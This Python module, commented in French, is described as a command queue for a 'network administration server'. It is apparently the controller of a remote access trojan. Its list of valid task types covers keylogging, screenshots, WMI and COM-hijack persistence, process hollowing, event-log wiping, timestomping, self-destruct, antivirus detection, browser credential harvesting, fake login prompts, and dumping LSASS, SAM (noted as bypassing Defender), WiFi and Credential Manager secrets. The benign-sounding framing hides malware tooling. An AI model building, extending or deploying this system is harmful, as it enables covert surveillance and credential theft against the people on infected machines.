"""
Module de gestion de la file d'attente des commandes pour le serveur d'administration réseau.

Ce module fournit une gestion centralisée et thread-safe des commandes à envoyer
aux clients ainsi que le stockage des résultats d'exécution.

Classes:
    Task: Dataclass représentant une tâche/commande à exécuter.
    TaskResult: Dataclass représentant le résultat d'une tâche.
    CommandQueue: Gestionnaire thread-safe de la file d'attente des commandes.

Exemple d'utilisation:
    >>> from command_queue import CommandQueue
    >>> queue = CommandQueue()
    >>> task_id = queue.add_task("client-uuid-123", "shell", {"command": "whoami"})
    >>> pending = queue.get_pending_tasks("client-uuid-123")
    >>> queue.add_result(task_id, "client-uuid-123", "DESKTOP\\user", "success")
"""

import uuid
import time
import threading
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Dict, List, Optional, Any

from logger import setup_logger

# Initialisation du logger
logger = setup_logger(__name__)

# Types de tâches valides
VALID_TASK_TYPES = [
    "shell",            # Exécuter commande CMD
    "keylog_start",     # Démarrer keylogger
    "keylog_stop",      # Arrêter keylogger
    "keylog_dump",      # Récupérer logs keylogger
    "upload",           # Upload fichier (client → serveur)
    "download",         # Download fichier (serveur → client)
    "persist_install",  # Installer persistance
    "persist_remove",   # Supprimer persistance
    "screenshot",       # Capture écran
    "terminate",        # Arrêter l'implant

    # === COMMANDES PROCESS (énumération processus) ===
    "ps",               # Lister tous les processus
    "proclist",         # Alias pour ps
    "psfind",           # Chercher un processus par nom
    "detect_av",        # Détecter logiciels de sécurité

    # === COMMANDES SYSINFO (reconnaissance système) ===
    "sysinfo",          # Rapport système complet
    "recon",            # Alias pour sysinfo
    "osinfo",           # Informations OS
    "hwinfo",           # Informations hardware (CPU, RAM, disques)
    "netinfo",          # Informations réseau
    "userinfo",         # Informations utilisateurs
    "software",         # Logiciels installés
    "services",         # Services en cours
    "startup",          # Programmes au démarrage
    "env",              # Variables d'environnement
    "connections",      # Connexions réseau actives
    "security",         # Statut sécurité (UAC, Firewall, Defender)
    "shares",           # Partages réseau
    "uptime",           # Temps de fonctionnement
    "domain",           # Informations domaine/workgroup

    # === COMMANDES FILE BROWSER (exploration fichiers) ===
    "ls",               # Lister répertoire
    "dir",              # Alias pour ls
    "cat",              # Lire fichier texte
    "type",             # Alias pour cat
    "search",           # Rechercher fichiers par pattern
    "drives",           # Lister les lecteurs disponibles

    # === COMMANDES CLEANUP (nettoyage traces système) ===
    "cleanup",          # Nettoyage complet de toutes les traces
    "cleanup_prefetch", # Nettoyer le prefetch Windows
    "cleanup_recent",   # Nettoyer les fichiers récents
    "cleanup_logs",     # Nettoyer les event logs Windows
    "timestomp",        # Modifier les timestamps d'un fichier
    "selfdestruct",     # Auto-destruction complète de l'implant

    # === COMMANDES PERSISTANCE AVANCÉE ===
    "wmi_install",      # Installer persistance WMI Event Subscription
    "wmi_remove",       # Supprimer persistance WMI
    "wmi_check",        # Vérifier persistance WMI
    "com_install",      # Installer persistance COM Hijacking
    "com_remove",       # Supprimer persistance COM
    "com_check",        # Vérifier persistance COM
    "request_elevation",# Demander élévation de privilèges
    "migrate",          # Migrer vers un autre processus (process hollowing)
    "uninstall_user", 
    "uninstall_admin",
    "watchdog_stop",
    "task_install",
    "task_remove",
    "task_check",
    "persist_status",
    "persist_all",
    "persist_remove_all",
    "persist_repair",
    "browser_harvest",
    "fake_login",

    # === COMMANDES CREDENTIAL DUMP ===
    "dump_wifi",        # Récupérer mots de passe WiFi
    "dump_credentials", # Récupérer Windows Credential Manager
    "dump_lsass",       # Dump LSASS (hashes/passwords) - ADMIN
    "dump_all",         # Dump ALL credentials
    "dump_sam"          # Dump SAM via esentutl (contourne Defender) - ADMIN
]


@dataclass
class Task:
    """
    Représente une tâche/commande à exécuter par un client.

    Cette dataclass stocke toutes les informations nécessaires pour suivre
    une commande depuis sa création jusqu'à son exécution.

    Attributes:
        task_id: UUID unique de la tâche.
        client_id: UUID du client cible.
        task_type: Type de commande (shell, keylog_start, upload, etc.).
        params: Paramètres de la commande (ex: {"command": "whoami"}).
        created_at: Timestamp de création (time.time()).
        status: État actuel ("pending", "sent", "completed", "failed", "timeout").
        sent_at: Timestamp d'envoi au client (None si pas encore envoyée).
        completed_at: Timestamp de réception du résultat (None si pas terminée).

    Exemple:
        >>> task = Task(
        ...     task_id="550e8400-...",
        ...     client_id="abc123-...",
        ...     task_type="shell",
        ...     params={"command": "whoami"},
        ...     created_at=time.time()
        ... )
    """

    task_id: str
    client_id: str
    task_type: str
    params: Dict[str, Any]
    created_at: float
    status: str = "pending"
    sent_at: Optional[float] = None
    completed_at: Optional[float] = None

    def to_dict(self) -> Dict[str, Any]:
        """
        Convertit l'objet Task en dictionnaire JSON-compatible.

        Les timestamps sont convertis au format ISO 8601 pour faciliter
        la lecture et l'interopérabilité.

        Returns:
            Dictionnaire avec toutes les informations de la tâche.

        Exemple:
            >>> task.to_dict()
            {
                "task_id": "550e8400-...",
                "client_id": "abc123-...",
                "task_type": "shell",
                "params": {"command": "whoami"},
                "created_at": "2025-11-24T14:30:00",
                "status": "pending",
                "sent_at": null,
                "completed_at": null
            }
        """
        return {
            "task_id": self.task_id,
            "client_id": self.client_id,
            "task_type": self.task_type,
            "params": self.params,
            "created_at": datetime.fromtimestamp(self.created_at).isoformat(),
            "status": self.status,
            "sent_at": datetime.fromtimestamp(self.sent_at).isoformat() if self.sent_at else None,
            "completed_at": datetime.fromtimestamp(self.completed_at).isoformat() if self.completed_at else None
        }

    def mark_sent(self) -> None:
        """
        Marque la tâche comme envoyée au client.

        Met à jour le status à "sent" et enregistre le timestamp d'envoi.

        Exemple:
            >>> task.mark_sent()
            >>> print(task.status)
            "sent"
        """
        self.status = "sent"
        self.sent_at = time.time()

    def mark_completed(self) -> None:
        """
        Marque la tâche comme complétée avec succès.

        Met à jour le status à "completed" et enregistre le timestamp de complétion.

        Exemple:
            >>> task.mark_completed()
            >>> print(task.status)
            "completed"
        """
        self.status = "completed"
        self.completed_at = time.time()

    def mark_failed(self) -> None:
        """
        Marque la tâche comme échouée.

        Met à jour le status à "failed" et enregistre le timestamp d'échec.

        Exemple:
            >>> task.mark_failed()
            >>> print(task.status)
            "failed"
        """
        self.status = "failed"
        self.completed_at = time.time()


@dataclass
class TaskResult:
    """
    Représente le résultat d'une tâche exécutée par un client.

    Cette dataclass stocke la sortie d'exécution d'une commande ainsi que
    son statut de réussite ou d'échec.

    Attributes:
        task_id: UUID de la tâche.
        client_id: UUID du client.
        output: Sortie de la commande (stdout/stderr).
        status: Statut d'exécution ("success" ou "error").
        error_message: Message d'erreur si status="error" (optionnel).
        received_at: Timestamp de réception du résultat.

    Exemple:
        >>> result = TaskResult(
        ...     task_id="550e8400-...",
        ...     client_id="abc123-...",
        ...     output="DESKTOP\\user",
        ...     status="success"
        ... )
    """

    task_id: str
    client_id: str
    output: str
    status: str
    error_message: Optional[str] = None
    received_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        """
        Convertit l'objet TaskResult en dictionnaire JSON-compatible.

        Returns:
            Dictionnaire avec toutes les informations du résultat.

        Exemple:
            >>> result.to_dict()
            {
                "task_id": "550e8400-...",
                "client_id": "abc123-...",
                "output": "DESKTOP\\user",
                "status": "success",
                "error_message": null,
                "received_at": "2025-11-24T14:35:00"
            }
        """
        return {
            "task_id": self.task_id,
            "client_id": self.client_id,
            "output": self.output,
            "status": self.status,
            "error_message": self.error_message,
            "received_at": datetime.fromtimestamp(self.received_at).isoformat()
        }


class CommandQueue:
    """
    Gestionnaire thread-safe de la file d'attente des commandes.

    Cette classe gère l'ensemble des commandes à envoyer aux clients ainsi que
    les résultats d'exécution. Toutes les opérations sont thread-safe.

    Attributes:
        _queues: Files d'attente par client {client_id: [Task, ...]}.
        _all_tasks: Index de toutes les tâches {task_id: Task}.
        _results: Résultats d'exécution {task_id: TaskResult}.
        _lock: Verrou threading pour garantir la thread-safety.

    Exemple:
        >>> queue = CommandQueue()
        >>> task_id = queue.add_task("client-123", "shell", {"command": "whoami"})
        >>> pending = queue.get_pending_tasks("client-123")
    """

    def __init__(self) -> None:
        """
        Initialise le gestionnaire de file d'attente de commandes.

        Crée les structures de données internes et le verrou de synchronisation.
        """
        self._queues: Dict[str, List[Task]] = {}
        self._all_tasks: Dict[str, Task] = {}
        self._results: Dict[str, TaskResult] = {}
        self._lock = threading.Lock()
        logger.info("CommandQueue initialisée")

    def add_task(
        self,
        client_id: str,
        task_type: str,
        params: Optional[Dict[str, Any]] = None
    ) -> str:
        """
        Ajoute une nouvelle tâche à la file d'attente d'un client.

        Génère un UUID unique, crée un objet Task et l'ajoute à la queue
        du client de manière thread-safe.

        Args:
            client_id: UUID du client cible.
            task_type: Type de commande (doit être dans VALID_TASK_TYPES).
            params: Paramètres de la commande (défaut: {}).

        Returns:
            UUID unique de la tâche créée.

        Raises:
            ValueError: Si le task_type n'est pas valide ou si client_id est vide.

        Exemple:
            >>> queue = CommandQueue()
            >>> task_id = queue.add_task("client-123", "shell", {"command": "whoami"})
            >>> print(task_id)
            "550e8400-e29b-41d4-a716-446655440000"
        """
        try:
            # Validation des paramètres
            if not client_id:
                raise ValueError("client_id ne peut pas être vide")

            if task_type not in VALID_TASK_TYPES:
                raise ValueError(
                    f"Type de tâche invalide: {task_type}. "
                    f"Types valides: {', '.join(VALID_TASK_TYPES)}"
                )

            # Paramètres par défaut
            if params is None:
                params = {}

            # Génération UUID et création task
            task_id = str(uuid.uuid4())
            timestamp = time.time()

            task = Task(
                task_id=task_id,
                client_id=client_id,
                task_type=task_type,
                params=params,
                created_at=timestamp
            )

            # Ajout thread-safe
            with self._lock:
                # Initialiser la queue du client si nécessaire
                if client_id not in self._queues:
                    self._queues[client_id] = []

                self._queues[client_id].append(task)
                self._all_tasks[task_id] = task

            logger.info(
                f"Tâche ajoutée: {task_type} pour client {client_id[:8]}... "
                f"(ID: {task_id[:8]}...)"
            )

            return task_id

        except ValueError as e:
            logger.error(f"Erreur de validation lors de l'ajout de tâche: {e}")
            raise
        except Exception as e:
            logger.error(f"Erreur lors de l'ajout de tâche: {e}", exc_info=True)
            raise

    def get_pending_tasks(self, client_id: str, mark_sent: bool = True) -> List[Task]:
        """
        Récupère les tâches en attente pour un client spécifique.

        Args:
            client_id: UUID du client.
            mark_sent: Si True, marque les tâches comme "sent" (défaut: True).

        Returns:
            Liste des tâches pending. Liste vide si aucune tâche ou client inexistant.

        Exemple:
            >>> pending = queue.get_pending_tasks("client-123")
            >>> for task in pending:
            ...     print(f"{task.task_type}: {task.params}")
            shell: {"command": "whoami"}
        """
        try:
            with self._lock:
                # Vérifier si le client a une queue
                if client_id not in self._queues:
                    logger.debug(f"Aucune queue pour le client {client_id[:8]}...")
                    return []

                # Filtrer les tâches pending
                pending_tasks = [
                    task for task in self._queues[client_id]
                    if task.status == "pending"
                ]

                # Marquer comme envoyées si demandé
                if mark_sent and pending_tasks:
                    for task in pending_tasks:
                        task.mark_sent()

                    logger.info(
                        f"{len(pending_tasks)} tâche(s) envoyée(s) au client "
                        f"{client_id[:8]}..."
                    )
                else:
                    logger.debug(
                        f"{len(pending_tasks)} tâche(s) pending pour client "
                        f"{client_id[:8]}... (non marquées envoyées)"
                    )

                return pending_tasks

        except Exception as e:
            logger.error(
                f"Erreur lors de la récupération des tâches pending: {e}",
                exc_info=True
            )
            return []

    def get_task(self, task_id: str) -> Optional[Task]:
        """
        Récupère une tâche spécifique par son ID.

        Args:
            task_id: UUID de la tâche.

        Returns:
            Task correspondante ou None si inexistante.

        Exemple:
            >>> task = queue.get_task("550e8400-...")
            >>> if task:
            ...     print(task.task_type)
            "shell"
        """
        try:
            with self._lock:
                task = self._all_tasks.get(task_id)

                if task is None:
                    logger.debug(f"Tâche introuvable: {task_id[:8]}...")

                return task

        except Exception as e:
            logger.error(f"Erreur lors de la récupération de la tâche: {e}", exc_info=True)
            return None

    def add_result(
        self,
        task_id: str,
        client_id: str,
        output: str,
        status: str,
        error_message: Optional[str] = None
    ) -> bool:
        """
        Enregistre le résultat d'exécution d'une tâche.

        Met à jour le status de la tâche (completed ou failed) et stocke
        le résultat pour consultation ultérieure.

        Args:
            task_id: UUID de la tâche.
            client_id: UUID du client.
            output: Sortie de la commande (stdout/stderr).
            status: Statut d'exécution ("success" ou "error").
            error_message: Message d'erreur si status="error" (optionnel).

        Returns:
            True si la tâche existe et le résultat a été enregistré, False sinon.

        Exemple:
            >>> success = queue.add_result(
            ...     "550e8400-...",
            ...     "client-123",
            ...     "DESKTOP\\user",
            ...     "success"
            ... )
            >>> print(success)
            True
        """
        try:
            with self._lock:
                # Vérifier que la tâche existe
                task = self._all_tasks.get(task_id)
                if task is None:
                    logger.warning(f"Tentative d'ajout de résultat pour tâche inexistante: {task_id[:8]}...")
                    return False

                # Créer le résultat
                result = TaskResult(
                    task_id=task_id,
                    client_id=client_id,
                    output=output,
                    status=status,
                    error_message=error_message
                )

                self._results[task_id] = result

                # Mettre à jour le status de la tâche
                if status == "success":
                    task.mark_completed()
                    logger.info(
                        f"✅ Résultat succès reçu pour tâche {task.task_type} "
                        f"(ID: {task_id[:8]}...)"
                    )
                else:
                    task.mark_failed()
                    logger.warning(
                        f"❌ Résultat échec reçu pour tâche {task.task_type} "
                        f"(ID: {task_id[:8]}...) - Erreur: {error_message}"
                    )

                return True

        except Exception as e:
            logger.error(f"Erreur lors de l'ajout du résultat: {e}", exc_info=True)
            return False

    def get_result(self, task_id: str) -> Optional[TaskResult]:
        """
        Récupère le résultat d'une tâche spécifique.

        Args:
            task_id: UUID de la tâche.

        Returns:
            TaskResult correspondant ou None si inexistant.

        Exemple:
            >>> result = queue.get_result("550e8400-...")
            >>> if result:
            ...     print(result.output)
            "DESKTOP\\user"
        """
        try:
            with self._lock:
                result = self._results.get(task_id)

                if result is None:
                    logger.debug(f"Résultat introuvable pour tâche: {task_id[:8]}...")

                return result

        except Exception as e:
            logger.error(f"Erreur lors de la récupération du résultat: {e}", exc_info=True)
            return None

    def get_client_results(self, client_id: str) -> List[TaskResult]:
        """
        Récupère tous les résultats d'un client spécifique.

        Args:
            client_id: UUID du client.

        Returns:
            Liste des résultats du client. Liste vide si aucun résultat.

        Exemple:
            >>> results = queue.get_client_results("client-123")
            >>> for result in results:
            ...     print(f"{result.status}: {result.output[:50]}")
        """
        try:
            with self._lock:
                client_results = [
                    result for result in self._results.values()
                    if result.client_id == client_id
                ]

                logger.debug(
                    f"{len(client_results)} résultat(s) trouvé(s) pour client "
                    f"{client_id[:8]}..."
                )

                return client_results

        except Exception as e:
            logger.error(
                f"Erreur lors de la récupération des résultats client: {e}",
                exc_info=True
            )
            return []

    def clear_client_queue(self, client_id: str) -> int:
        """
        Supprime toutes les tâches pending d'un client.

        Args:
            client_id: UUID du client.

        Returns:
            Nombre de tâches supprimées.

        Exemple:
            >>> cleared = queue.clear_client_queue("client-123")
            >>> print(f"{cleared} tâches supprimées")
            3 tâches supprimées
        """
        try:
            with self._lock:
                if client_id not in self._queues:
                    logger.debug(f"Aucune queue à nettoyer pour client {client_id[:8]}...")
                    return 0

                # Compter les pending avant suppression
                pending_count = sum(
                    1 for task in self._queues[client_id]
                    if task.status == "pending"
                )

                # Filtrer pour ne garder que les non-pending
                self._queues[client_id] = [
                    task for task in self._queues[client_id]
                    if task.status != "pending"
                ]

                if pending_count > 0:
                    logger.info(
                        f"{pending_count} tâche(s) pending supprimée(s) pour client "
                        f"{client_id[:8]}..."
                    )

                return pending_count

        except Exception as e:
            logger.error(f"Erreur lors du nettoyage de la queue: {e}", exc_info=True)
            return 0

    def get_stats(self) -> Dict[str, int]:
        """
        Calcule les statistiques des tâches.

        Returns:
            Dictionnaire avec les compteurs:
                - pending: Tâches en attente
                - sent: Tâches envoyées
                - completed: Tâches complétées
                - failed: Tâches échouées
                - timeout: Tâches en timeout
                - total_results: Nombre total de résultats

        Exemple:
            >>> stats = queue.get_stats()
            >>> print(stats)
            {"pending": 5, "sent": 2, "completed": 10, "failed": 1, "timeout": 0, "total_results": 11}
        """
        try:
            with self._lock:
                stats = {
                    "pending": 0,
                    "sent": 0,
                    "completed": 0,
                    "failed": 0,
                    "timeout": 0,
                    "total_results": len(self._results)
                }

                # Compter par status
                for task in self._all_tasks.values():
                    if task.status in stats:
                        stats[task.status] += 1

                logger.debug(f"Stats tâches: {stats}")

                return stats

        except Exception as e:
            logger.error(f"Erreur lors du calcul des stats: {e}", exc_info=True)
            return {
                "pending": 0,
                "sent": 0,
                "completed": 0,
                "failed": 0,
                "timeout": 0,
                "total_results": 0
            }

    def cleanup_stale_tasks(self, timeout: int = 300) -> int:
        """
        Marque comme "timeout" les tâches envoyées mais sans réponse.

        Parcourt toutes les tâches avec status="sent" et les marque comme
        "timeout" si elles ont été envoyées il y a plus de `timeout` secondes.

        Args:
            timeout: Délai d'expiration en secondes (défaut: 300 = 5 min).

        Returns:
            Nombre de tâches marquées en timeout.

        Exemple:
            >>> affected = queue.cleanup_stale_tasks(timeout=300)
            >>> print(f"{affected} tâches expirées")
            2 tâches expirées
        """
        try:
            affected = 0
            current_time = time.time()

            with self._lock:
                for task in self._all_tasks.values():
                    # Vérifier si tâche "sent" et sent_at défini
                    if task.status == "sent" and task.sent_at is not None:
                        elapsed = current_time - task.sent_at

                        if elapsed >= timeout:
                            task.status = "timeout"
                            task.completed_at = current_time
                            affected += 1

                            logger.warning(
                                f"⏱️ Tâche expirée (timeout): {task.task_type} "
                                f"(ID: {task.task_id[:8]}...) - "
                                f"Envoyée il y a {int(elapsed)}s"
                            )

            if affected > 0:
                logger.info(f"Cleanup: {affected} tâche(s) marquée(s) en timeout")

            return affected

        except Exception as e:
            logger.error(f"Erreur lors du cleanup des tâches: {e}", exc_info=True)
            return 0

    def get_all_results(self) -> List[Dict[str, Any]]:
        """
        Récupère tous les résultats stockés.

        Returns:
            Liste de dictionnaires contenant tous les résultats.

        Exemple:
            >>> results = queue.get_all_results()
            >>> print(f"Total résultats: {len(results)}")
        """
        try:
            with self._lock:
                return [asdict(result) for result in self._results.values()]

        except Exception as e:
            logger.error(f"Erreur lors de la récupération de tous les résultats: {e}", exc_info=True)
            return []

    def get_result_dict(self, task_id: str) -> Optional[Dict[str, Any]]:
        """
        Récupère le résultat d'une tâche spécifique sous forme de dictionnaire.

        Args:
            task_id: UUID de la tâche.

        Returns:
            Dictionnaire contenant le résultat ou None si inexistant.

        Exemple:
            >>> result = queue.get_result_dict("550e8400-...")
            >>> if result:
            ...     print(result['output'])
        """
        try:
            with self._lock:
                result = self._results.get(task_id)
                if result:
                    return asdict(result)
                return None

        except Exception as e:
            logger.error(f"Erreur lors de la récupération du résultat: {e}", exc_info=True)
            return None


# Tests et exemples d'utilisation
if __name__ == "__main__":
    """
    Tests inline du module command_queue.

    Exécutez ce script directement pour tester toutes les fonctionnalités
    du gestionnaire de file d'attente de commandes.
    """
    print("="*70)
    print("🧪 TESTS COMMAND QUEUE - SYSTÈME D'ADMINISTRATION RÉSEAU")
    print("="*70)

    # 1. Création de la queue
    print("\n[TEST 1] Création CommandQueue")
    queue = CommandQueue()
    print("✅ CommandQueue créée")

    # IDs de test
    client_id_1 = "client-uuid-111"
    client_id_2 = "client-uuid-222"

    # 2. Ajout de plusieurs tâches pour différents clients
    print("\n[TEST 2] Ajout de tâches")
    tasks_to_add = [
        (client_id_1, "shell", {"command": "whoami"}),
        (client_id_1, "shell", {"command": "ipconfig"}),
        (client_id_1, "keylog_start", {}),
        (client_id_2, "shell", {"command": "systeminfo"}),
        (client_id_2, "screenshot", {})
    ]

    task_ids = []
    for client_id, task_type, params in tasks_to_add:
        task_id = queue.add_task(client_id, task_type, params)
        task_ids.append(task_id)
        print(f"✅ Tâche ajoutée: {task_type} pour {client_id} - ID: {task_id[:8]}...")

    # 3. Test validation task_type invalide
    print("\n[TEST 3] Validation task_type invalide")
    try:
        invalid_task = queue.add_task(client_id_1, "invalid_type", {})
        print("❌ ÉCHEC: ValueError devrait être levée")
    except ValueError as e:
        print(f"✅ ValueError correctement levée: {e}")

    # 4. Test get_pending_tasks avec mark_sent=True
    print("\n[TEST 4] Récupération tâches pending (mark_sent=True)")
    pending_1 = queue.get_pending_tasks(client_id_1, mark_sent=True)
    print(f"✅ Client 1: {len(pending_1)} tâche(s) pending récupérée(s)")
    for task in pending_1:
        print(f"   - {task.task_type} | Status: {task.status} | Params: {task.params}")
        assert task.status == "sent", "Task devrait être marquée 'sent'"

    pending_2 = queue.get_pending_tasks(client_id_2, mark_sent=True)
    print(f"✅ Client 2: {len(pending_2)} tâche(s) pending récupérée(s)")

    # Vérifier qu'un second appel retourne 0 (déjà marquées sent)
    pending_1_again = queue.get_pending_tasks(client_id_1, mark_sent=True)
    print(f"✅ Client 1 (2ème appel): {len(pending_1_again)} tâche(s) (attendu: 0)")
    assert len(pending_1_again) == 0, "Devrait être vide car déjà marquées sent"

    # 5. Test add_result (success et error)
    print("\n[TEST 5] Ajout de résultats")
    # Résultat success
    success_result = queue.add_result(
        task_ids[0],
        client_id_1,
        "DESKTOP\\Administrator",
        "success"
    )
    print(f"✅ Résultat success ajouté: {success_result}")
    assert success_result is True, "add_result devrait retourner True"

    # Résultat error
    error_result = queue.add_result(
        task_ids[1],
        client_id_1,
        "Command failed",
        "error",
        "Access denied"
    )
    print(f"✅ Résultat error ajouté: {error_result}")

    # Résultat pour task inexistante
    fake_result = queue.add_result(
        "fake-task-uuid-999",
        client_id_1,
        "output",
        "success"
    )
    print(f"❌ Résultat task inexistante (attendu False): {fake_result}")
    assert fake_result is False, "Devrait retourner False pour task inexistante"

    # 6. Test get_result
    print("\n[TEST 6] Récupération résultat")
    result = queue.get_result(task_ids[0])
    if result:
        print(f"✅ Résultat récupéré: {result.status} - {result.output}")
        print(f"   Détails: {result.to_dict()}")
    else:
        print("❌ Échec récupération résultat")

    # 7. Test get_task
    print("\n[TEST 7] Récupération tâche")
    task = queue.get_task(task_ids[0])
    if task:
        print(f"✅ Tâche récupérée: {task.task_type} | Status: {task.status}")
        print(f"   Détails: {task.to_dict()}")
        assert task.status == "completed", "Task devrait être 'completed'"
    else:
        print("❌ Échec récupération tâche")

    # 8. Test get_client_results
    print("\n[TEST 8] Récupération résultats client")
    client_results = queue.get_client_results(client_id_1)
    print(f"✅ Résultats client 1: {len(client_results)}")
    for result in client_results:
        print(f"   - {result.status}: {result.output[:50]}")

    # 9. Test get_stats
    print("\n[TEST 9] Statistiques système")
    stats = queue.get_stats()
    print(f"✅ Stats: {stats}")
    assert stats["completed"] >= 1, "Au moins 1 task completed"
    assert stats["failed"] >= 1, "Au moins 1 task failed"
    assert stats["sent"] >= 1, "Au moins 1 task sent"

    # 10. Test cleanup_stale_tasks
    print("\n[TEST 10] Cleanup tâches expirées")
    print("⏳ Simulation tâche ancienne (modification manuelle sent_at)...")

    # Ajouter une nouvelle tâche et la marquer sent avec ancien timestamp
    old_task_id = queue.add_task(client_id_1, "shell", {"command": "old_command"})
    old_task = queue.get_task(old_task_id)
    if old_task:
        old_task.mark_sent()
        old_task.sent_at = time.time() - 400  # 400 secondes dans le passé
        print(f"   Tâche {old_task_id[:8]}... rendue ancienne (-400s)")

    affected = queue.cleanup_stale_tasks(timeout=300)  # 5 min
    print(f"✅ Cleanup effectué: {affected} tâche(s) expirée(s)")
    assert affected >= 1, "Au moins 1 task devrait être expirée"

    # Vérifier status après cleanup
    old_task_after = queue.get_task(old_task_id)
    if old_task_after:
        print(f"   Status après cleanup: {old_task_after.status}")
        assert old_task_after.status == "timeout", "Task devrait être 'timeout'"

    # 11. Test clear_client_queue
    print("\n[TEST 11] Nettoyage queue client")
    # Ajouter des nouvelles tâches pending
    queue.add_task(client_id_2, "shell", {"command": "test1"})
    queue.add_task(client_id_2, "shell", {"command": "test2"})

    cleared = queue.clear_client_queue(client_id_2)
    print(f"✅ Tâches pending supprimées pour client 2: {cleared}")

    # Vérifier qu'il n'y a plus de pending
    pending_after_clear = queue.get_pending_tasks(client_id_2, mark_sent=False)
    print(f"   Tâches pending restantes: {len(pending_after_clear)}")
    assert len(pending_after_clear) == 0, "Queue devrait être vide"

    # 12. Test thread-safety basique
    print("\n[TEST 12] Test thread-safety basique")

    def worker_add_tasks(queue: CommandQueue, worker_id: int, client_id: str) -> None:
        """Thread worker pour test concurrentiel."""
        for i in range(5):
            queue.add_task(
                client_id,
                "shell",
                {"command": f"worker_{worker_id}_cmd_{i}"}
            )

    threads = []
    test_client = "thread-test-client"

    for i in range(3):
        t = threading.Thread(target=worker_add_tasks, args=(queue, i, test_client))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    pending_concurrent = queue.get_pending_tasks(test_client, mark_sent=False)
    print(f"✅ Test concurrentiel: {len(pending_concurrent)} tâches ajoutées (15 attendues)")
    assert len(pending_concurrent) == 15, f"Thread-safety: attendu 15, obtenu {len(pending_concurrent)}"

    # 13. Stats finales
    print("\n[TEST 13] Statistiques finales")
    final_stats = queue.get_stats()
    print(f"✅ Stats finales: {final_stats}")
    print(f"   Total tâches: {sum([v for k, v in final_stats.items() if k != 'total_results'])}")
    print(f"   Total résultats: {final_stats['total_results']}")

    print("\n" + "="*70)
    print("✅ TOUS LES TESTS RÉUSSIS")
    print("="*70)
